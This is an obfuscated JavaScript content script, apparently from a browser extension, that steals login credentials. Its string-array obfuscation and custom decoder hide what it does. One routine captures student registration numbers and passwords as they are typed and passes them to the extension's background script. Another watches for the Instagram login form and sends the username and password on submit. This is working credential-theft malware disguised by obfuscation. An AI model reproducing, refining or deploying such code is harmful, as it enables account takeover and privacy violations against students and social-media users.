function a0a() {
  const p = [
    "C3r1zgvUDf9KyxrH",
    "mJi2nZqWAMDPAvz4",
    "zM9YrwfJAa",
    "Aw5ZDgfNCMfTlMnVBq",
    "Aw5ZDgfNCMfTx2XVz2LUx2rHDge",
    "jwpINiuGw0LhxsbmB2DPBIbMB3jTigrLDgvJDgvK",
    "mtbZvKfUDwS",
    "CxvLCNLtzwXLy3rVCG",
    "z2v0rwXLBwvUDej5swq",
    "jwpIMQdVUi8GtfbvigLUChv0CYbUB3qGzM91BMqGywz0zxiGBwf4ihjLDhjPzxmUifnJCMLWDcbZDg9WCgvKlG",
    "mJeWoxjKve1cBa",
    "DhjPBq",
    "nJG2mdmXnLLeruLbCa",
    "Aw5JBhvKzxm",
    "y2HHBMDL",
    "nJmYDgP6yuz2",
    "Aw5WDxrBBMfTzt0NDxnLCM5HBwuNxq",
    "y29SB3i6igDYzwvUoW",
    "D2fYBG",
    "jwpINiuGtfbvigLUChv0igXPC3rLBMvYCYbHDhrHy2HLza",
    "DhH0vq",
    "Aw5WDxrBBMfTzt0NCgfZC3DVCMqNxq",
    "vhH0ChDKqxv0B0LKxZG3nJC",
    "CNvUDgLTzq",
    "4P2mievYCM9YihnLDhrPBMCGDxaGtfbvigXPC3rLBMvYCZO",
    "y29SB3i6ign5yw47",
    "nJK2vhfQt0jX",
    "Bg9N",
    "mtnZwgzAr2W",
    "4PQG77IpifTjr10Grw1WDhKGDxnLCM5HBwuGB3iGCgfZC3DVCMqSig5VDcbZzw50",
    "y29SB3i6ig9Yyw5NztSGzM9UDc13zwLNAhq6igjVBgq7",
    "mti1mvf6sxnpvW",
    "mJHfreLZCfK",
    "4PQG77IpifTjr10Gtg9NAw4GC25PzMyGzMfPBgvKigfMDgvYig1HEcbHDhrLBxb0CW",
    "odeWntiWDunNAxL3",
    "Aw5WDxq",
    "ndm1nJrfuvfyz1e",
    "ywrKrxzLBNrmAxn0zw5LCG",
    "jwpWN5oKifTjr10Gq2fWDhvYzwqGy3jLzgvUDgLHBhm6icvJ",
    "y29SB3i6ig9Yyw5NztS",
    "yNv0Dg9Uw3r5Cgu9j3n1yM1PDcDDoM5VDcHBzgLZywjSzwrDkq",
    "y2XPy2S",
    "n0nfAfPhsW",
    "yMX1CG",
    "Ag9ZDg5HBwu",
    "C2vUze1LC3nHz2u",
    "mJaXnJy4nvniBMvkBG",
    "zxjYB3i",
    "DMfSDwu",
  ];
  a0a = function () {
    return p;
  };
  return a0a();
}
const a0m = a0b;
(function (a, b) {
  const g = a0b,
    c = a();
  while (!![]) {
    try {
      const d =
        (parseInt(g(0xd1)) / 0x1) * (parseInt(g(0xcb)) / 0x2) +
        (-parseInt(g(0xe2)) / 0x3) * (parseInt(g(0xb6)) / 0x4) +
        -parseInt(g(0xc9)) / 0x5 +
        (parseInt(g(0xd9)) / 0x6) * (-parseInt(g(0xc7)) / 0x7) +
        (parseInt(g(0xc1)) / 0x8) * (-parseInt(g(0xc6)) / 0x9) +
        (parseInt(g(0xde)) / 0xa) * (-parseInt(g(0xd5)) / 0xb) +
        (-parseInt(g(0xb3)) / 0xc) * (-parseInt(g(0xc3)) / 0xd);
      if (d === b) break;
      else c["push"](c["shift"]());
    } catch (e) {
      c["push"](c["shift"]());
    }
  }
})(a0a, 0x197d1);
function sendStudentData(a, b) {
  const h = a0b;
  chrome[h(0xbe)][h(0xd4)]({
    type: h(0xd8),
    data: { registrationNumber: a, password: b },
  });
}
function a0b(a, b) {
  const c = a0a();
  return (
    (a0b = function (d, e) {
      d = d - 0xb2;
      let f = c[d];
      if (a0b["vBHITX"] === undefined) {
        var g = function (l) {
          const m =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let n = "",
            o = "";
          for (
            let p = 0x0, q, r, s = 0x0;
            (r = l["charAt"](s++));
            ~r && ((q = p % 0x4 ? q * 0x40 + r : r), p++ % 0x4)
              ? (n += String["fromCharCode"](0xff & (q >> ((-0x2 * p) & 0x6))))
              : 0x0
          ) {
            r = m["indexOf"](r);
          }
          for (let t = 0x0, u = n["length"]; t < u; t++) {
            o +=
              "%" +
              ("00" + n["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
          }
          return decodeURIComponent(o);
        };
        (a0b["tmkefa"] = g), (a = arguments), (a0b["vBHITX"] = !![]);
      }
      const h = c[0x0],
        i = d + h,
        j = a[i];
      return !j ? ((f = a0b["tmkefa"](f)), (a[i] = f)) : (f = j), f;
    }),
    a0b(a, b)
  );
}
function setupStudentListeners() {
  const i = a0b;
  try {
    const a = document[i(0xe0)](i(0xbb)),
      b = document[i(0xe0)](i(0xbd));
    if (!a || !b) return ![];
    const c = () => {
      const j = i,
        d = a[j(0xd7)][j(0xb2)](),
        f = b[j(0xd7)];
      if (d && f) sendStudentData(d, f);
    };
    return (
      c(),
      [i(0xca), i(0xb5), i(0xd2)][i(0xda)]((d) => {
        const k = i;
        a[k(0xcc)](d, c), b[k(0xcc)](d, c);
      }),
      console[i(0xc2)](i(0xba), i(0xb8)),
      !![]
    );
  } catch (d) {
    return console[i(0xd6)](i(0xbf), d), ![];
  }
}
if (!setupStudentListeners()) {
  let retries = 0x0;
  const maxRetries = 0xf,
    interval = setInterval(() => {
      const l = a0b;
      retries++,
        (setupStudentListeners() || retries >= maxRetries) &&
          (clearInterval(interval),
          retries >= maxRetries && console[l(0xc2)](l(0xe1), l(0xce)));
    }, 0x2bc);
}
if (location[a0m(0xd3)][a0m(0xb4)](a0m(0xdb))) {
  let igTries = 0x0;
  const igMaxTries = 0x19,
    sniffInstagramLogin = setInterval(() => {
      const n = a0m;
      igTries++;
      const a = document[n(0xdf)](n(0xb7)),
        b = document[n(0xdf)](n(0xbc)),
        c = document[n(0xdf)](n(0xcf));
      a &&
        b &&
        c &&
        (console[n(0xc2)](n(0xdd), n(0xb8)),
        c[n(0xcc)](
          n(0xd0),
          () => {
            const o = n,
              d = a[o(0xd7)][o(0xb2)](),
              e = b[o(0xd7)];
            d && e
              ? (console[o(0xc2)](o(0xcd) + d, o(0xc0), o(0xc5)),
                chrome[o(0xbe)][o(0xd4)]({
                  type: o(0xdc),
                  data: { username: d, password: e },
                }))
              : console[o(0xb9)](o(0xc4));
          },
          { once: !![] }
        ),
        clearInterval(sniffInstagramLogin)),
        igTries >= igMaxTries &&
          (console[n(0xb9)](n(0xc8)), clearInterval(sniffInstagramLogin));
    }, 0x2bc);
}
